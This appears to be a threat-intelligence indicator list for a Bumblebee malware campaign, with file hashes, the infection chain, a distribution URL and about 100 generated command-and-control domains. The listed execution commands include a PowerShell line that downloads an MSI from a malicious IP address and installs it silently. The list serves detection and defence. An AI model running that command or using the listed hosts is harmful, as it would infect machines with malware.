@@ -1,0 +1,142 @@
+Bumblebee | 03.10.2024 |  NEW_BLACK | 
+
+***************************************
+
+.url 
+.zip 2bca5abfac168454ce4e97a10ccf8ffc068e1428fa655286210006b298de42fb
+.msi c26344bfd07b871dd9f6bd7c71275216e18be265e91e5d0800348e8aa06543f9
+.exe 7df703625ee06db2786650b48ffefb13fa1f0dae41e521b861a16772e800c115
+
+*************************************** 
+
+.zip > .lnk > url > .msi > .dll
+
+Exec >>
+
+cmd /c C:\Users\Admin\AppData\Local\Temp\Report-41952.lnk
+
+powershell.exe" Invoke-WebRequest http://193.242.145.138/mid/w1/Midjourney.msi -OutFile "C:\Users\Admin\AppData\Roaming\y.msi";msiexec /i C:\Users\Admin\AppData\Roaming\y.msi /qn
+
+msiexec.exe /i C:\Users\Admin\AppData\Roaming\y.msi /qn
+
+msiexec.exe /V
+
+MsiExec.exe -Embedding B8B55B426320D1345590D1E9B63D67B7
+
+MsiExec.exe /Y "C:\ProgramData\BDncqpUxZl.dll"
+
+***************************************
+
+distro 
+
+http://193.242.145.138/mid/w1/Midjourney.msi
+
+***************************************
+
+c2's
+
+dga_seed 1.0163655285949564e+18
+domain_length 11
+num_dga_domains 100
+port 443
+
+tvx1ovdepj8.life
+acgr6r8zdot.life
+ilofx941igp.life
+8x2apo5m7ri.life
+x9yrzer0ndt.life
+93j4v4jopzd.life
+ameagxzo2f7.life
+nyy41uibsv5.life
+ru4jvijdytq.life
+l9t6r0y6cvi.life
+f4vb9n3tdvh.life
+9do3mcejztt.life
+pxu1ajsdhqr.life
+7exy2b231n2.life
+vu5b47m18jn.life
+6mnudp7zj73.life
+p5047yjrb8q.life
+d0xtxp89bb9.life
+ygo9u1fkwux.life
+fig3gj0v6qe.life
+38f5wvwwn7o.life
+txgogs9p8a1.life
+uyn0icgx1kv.life
+2z1ls31az7s.life
+0cc2z8zrnhf.life
+fsr2hskx44p.life
+du19ek78tjw.life
+234ct3lkozp.life
+he8fq4k8d3w.life
+7ewh8ltr7il.life
+dw34kmgfl7t.life
+f2j20ayqh8y.life
+331k2rdkmmb.life
+37z6li6l9y2.life
+dpgs2lt1sbz.life
+plll0xq4y82.life
+bzc9sq2pz53.life
+7r8ln1wswth.life
+y9neib92f2m.life
+m5iukps17y7.life
+xo8be64ejh2.life
+widn8soih8u.life
+08mkuqnx6gv.life
+lzeqr3apopn.life
+o4m5a5no7e8.life
+2u8znzsbrto.life
+dxyob8x456a.life
+lrugnff8fkc.life
+38i6lh0rpze.life
+mjb3r6mcs1f.life
+vl41cymzzfq.life
+qc4mwjiop45.life
+z3z4fq0420z.life
+0tab35o0swu.life
+4izk0gc9is6.life
+6brdh3p893b.life
+736d0mvetjw.life
+drmk5rdefb5.life
+1v0xhie4os8.life
+khxcp22s3dz.life
+8z9m8hndrhp.life
+xeoz1f1vjs0.life
+lobavyclh8e.life
+in4pzu7t2pv.life
+j280b59doxz.life
+6q894zusd4k.life
+y7pzxau0717.life
+bev8ymaajb7.life
+glux8x5b8d6.life
+yan95akxgqt.life
+9qiliikd3sp.life
+ge0lpqif3ar.life
+ar7xakeve0o.life
+eb4l6wisq9z.life
+1grovn87c8s.life
+wdga570b8pz.life
+nzs8vi9w5o8.life
+q7dfpyyhe08.life
+exueqqmz3ia.life
+65r8nx12fqr.life
+vauy5ah65sx.life
+8hjv8mbhrlj.life
+eeqwg3mzq07.life
+b1h0uaabzyz.life
+8qvt5iabz5n.life
+8ru044xed25.life
+w8ligr695sd.life
+3e6rrifr5fn.life
+9f6p9g7x13s.life
+ibcm5at6qrz.life
+spd22scperm.life
+4k59ij2ujeu.life
+07zxfo0kere.life
+nhdeapyfg7e.life
+y0zvqpi42no.life
+zdf5ki8x9r0.life
+8mgj12azbyd.life
+l6syolvczan.life
+mk7plk9c6i2.life
+hudrx8fn980.life
